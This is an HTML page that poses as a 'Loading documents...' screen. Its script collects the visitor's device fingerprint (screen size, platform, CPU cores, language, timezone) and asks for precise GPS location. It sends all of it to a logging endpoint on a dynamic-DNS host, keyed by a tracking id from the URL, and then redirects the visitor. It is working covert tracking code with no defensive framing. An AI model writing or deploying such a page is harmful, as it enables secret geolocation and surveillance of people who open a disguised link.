<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading documents...</title>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const slug = urlParams.get('id');
        const targetServer = "http://echomapwa.ddns.net/logger/api/log_advance/"; // Эндпоинт логов
        const finalRedirect = "http://echomapwa.ddns.net/logger/l/"; // Эндпоинт редиректа

        async function collectAndGo() {
            if (!slug) {
                document.body.innerHTML = "Document not found.";
                return;
            }

            let info = {
                sw: window.screen.width, sh: window.screen.height,
                plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                gpu: "Unknown", coords: null
            };

            // Пытаемся взять GPS (т.к. GitHub на HTTPS, это сработает)
            if ("geolocation" in navigator) {
                try {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000, enableHighAccuracy: true});
                    });
                    info.coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                } catch(e) { console.log("GPS Denied/Timeout"); }
            }

            // Отправляем данные на твой сервер через POST (AJAX)
            try {
                await fetch(targetServer + slug, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(info)
                });
            } catch(e) { console.error("Server error"); }

            // После отправки логов — финальный редирект
            window.location.href = finalRedirect + slug;
        }

        collectAndGo();
    </script>
</body>
</html>
